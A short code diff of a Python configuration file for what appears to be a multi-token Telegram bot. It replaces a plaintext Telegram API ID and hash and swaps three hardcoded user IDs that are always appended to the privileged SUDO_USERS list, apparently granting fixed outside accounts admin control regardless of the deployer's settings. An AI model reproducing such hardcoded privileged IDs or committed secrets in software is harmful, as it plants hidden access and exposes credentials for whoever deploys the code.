@@ -10,8 +10,8 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = 21752239
-API_HASH = "c8b3165d3724af66069ab56d110d7a65"
+API_ID = 27039222
+API_HASH = "012132b2eb13421326dba06a05efedc5"
 CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(1939017724)
-SUDO_USERS.append(1338679175)
-SUDO_USERS.append(6350295776)
+SUDO_USERS.append(6902636111)
+SUDO_USERS.append(811413470)
+SUDO_USERS.append(6713994904)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
